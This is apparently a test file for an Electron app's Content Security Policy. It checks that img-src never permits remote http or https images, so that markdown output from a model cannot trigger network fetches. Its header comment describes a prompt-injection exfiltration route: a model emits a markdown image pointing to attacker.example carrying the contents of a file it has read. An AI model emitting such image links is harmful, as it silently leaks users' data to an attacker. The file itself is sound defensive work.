import test from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

/**
 * The Content Security Policy is a security control that lives in a string
 * literal, so nothing else can check it. These read the source.
 *
 * The rule that matters: `img-src` must not allow https. The renderer displays
 * model output as markdown, and an <img> is fetched the instant it renders, so a
 * prompt-injected model could emit
 * `![](https://attacker.example/?d=<file it just read>)` and the data would leave
 * silently, with no click and nothing visible. Markdown.tsx offers remote images
 * as links instead; this directive is what makes a missed path fail closed.
 */

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const INDEX = fs.readFileSync(path.join(ROOT, 'electron/main/index.ts'), 'utf8')
const MARKDOWN = fs.readFileSync(path.join(ROOT, 'src/components/Markdown.tsx'), 'utf8')

/** Every `img-src …` directive written in the main process. */
function imgSrcDirectives(): string[] {
  return [...INDEX.matchAll(/"(img-src [^"]*)"/g)].map((m) => m[1])
}

test('both the dev and packaged policies declare img-src', () => {
  // Two policies exist. If one ever loses its directive, the default-src
  // fallback would silently permit whatever default-src allows.
  assert.equal(imgSrcDirectives().length, 2)
})

test('no img-src permits remote http or https', () => {
  for (const directive of imgSrcDirectives()) {
    assert.ok(!/https:/.test(directive), `img-src allows https: ${directive}`)
    assert.ok(!/http:/.test(directive), `img-src allows http: ${directive}`)
    assert.ok(!directive.includes('*'), `img-src uses a wildcard: ${directive}`)
  }
})

// Generated images arrive as data: URLs from readLocalImage and are never
// fetched over the network, so blocking them would break a working feature for
// no gain.
test('data: and blob: remain allowed, so local and generated images still render', () => {
  for (const directive of imgSrcDirectives()) {
    assert.match(directive, /data:/)
    assert.match(directive, /blob:/)
  }
})

// What the renderer produces for a remote source is asserted by rendering it,
// in `markdown-remote-images.test.ts`. It used to be asserted here by matching
// text in Markdown.tsx, which could only ever describe the file as written: it
// could not answer what a given source produces, and a remote <img> arriving by
// a route those strings did not describe was invisible to all of them.
//
// The two halves stay in separate files on purpose. This one reads a policy
// that lives in a string literal in the main process and has nothing to render;
// that one mounts a component.

test('the renderer module still exists where the policy assumes it does', () => {
  // Cheap tripwire, and the only claim this file can honestly make about the
  // renderer. If Markdown.tsx moves or goes away, the behavioural tests are the
  // thing to follow, not this.
  assert.ok(MARKDOWN.length > 0)
})

test('the preview pane is deliberately outside this policy', () => {
  // hardenSession configures defaultSession; the pane runs on its own partition,
  // so a user's dev server is not subject to the app's CSP. If this ever changed
  // to a global handler, someone's own site would start breaking in the preview.
  assert.match(INDEX, /session\.defaultSession\.webRequest\.onHeadersReceived/)
  const preview = fs.readFileSync(path.join(ROOT, 'electron/main/preview.ts'), 'utf8')
  assert.ok(
    !/onHeadersReceived/.test(preview),
    'the preview session must not impose a CSP on the user own dev server'
  )
})
